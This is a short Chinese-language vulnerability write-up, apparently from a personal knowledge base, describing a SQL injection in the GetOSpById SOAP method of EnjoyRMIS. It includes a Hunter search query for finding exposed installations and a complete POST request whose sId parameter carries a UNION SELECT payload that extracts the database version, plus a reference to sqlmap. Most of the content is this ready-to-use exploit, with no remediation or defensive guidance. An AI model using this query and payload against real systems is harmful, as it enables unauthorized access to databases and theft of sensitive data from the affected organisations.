# EnjoyRMIS GetOSpById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征

![1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89.png](./img/OEK9tkHunYY08in-/1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89-970499.png)

# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOSpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOSpById xmlns="http://tempuri.org/">
      <sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId>
    </GetOSpById>
  </soap:Body>
</soap:Envelope> 
```

![1700576430999-14827fbf-6822-4dd6-a406-10bab39365a4.png](./img/OEK9tkHunYY08in-/1700576430999-14827fbf-6822-4dd6-a406-10bab39365a4-024610.png)

sqlmap

![1700576440841-41c461df-14f0-4f7d-92c9-eb8d6faa0e2b.png](./img/OEK9tkHunYY08in-/1700576440841-41c461df-14f0-4f7d-92c9-eb8d6faa0e2b-231689.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zpzm4hme69hpf525>